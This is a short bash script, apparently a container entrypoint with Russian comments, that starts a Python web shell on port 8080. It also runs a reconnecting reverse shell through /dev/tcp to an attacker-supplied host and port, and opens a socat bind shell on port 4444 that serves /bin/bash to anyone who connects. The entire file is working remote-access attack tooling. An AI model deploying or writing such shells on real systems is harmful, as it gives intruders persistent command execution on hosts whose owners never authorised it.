#!/usr/bin/env bash
set -u

BIND_PORT="${BIND_PORT:-4444}"
WS_PORT="${WS_PORT:-8080}"

# Web shell (HTTP exec) — основной канал, идёт через домен приложения/Traefik
echo "[*] webshell on 0.0.0.0:${WS_PORT}"
python3 /opt/webshell.py &

# Reverse shell (если заданы RHOST/RPORT): контейнер сам цепляется к листенеру
if [[ -n "${RHOST:-}" && -n "${RPORT:-}" ]]; then
  echo "[*] reverse shell loop -> ${RHOST}:${RPORT}"
  (
    while true; do
      bash -i >& "/dev/tcp/${RHOST}/${RPORT}" 0>&1
      sleep 5
    done
  ) &
fi

if [[ -n "${BIND_PORT}" && "${BIND_PORT}" != "0" ]]; then
  # Bind shell: снаружи `nc <host> ${BIND_PORT}` (socat в режиме pipes, без pty)
  echo "[*] bind shell (socat, pipes) on 0.0.0.0:${BIND_PORT}"
  exec socat "TCP-LISTEN:${BIND_PORT},reuseaddr,fork" EXEC:/bin/bash,pipes,stderr
else
  echo "[*] no bind shell: sleep infinity"
  exec sleep infinity
fi
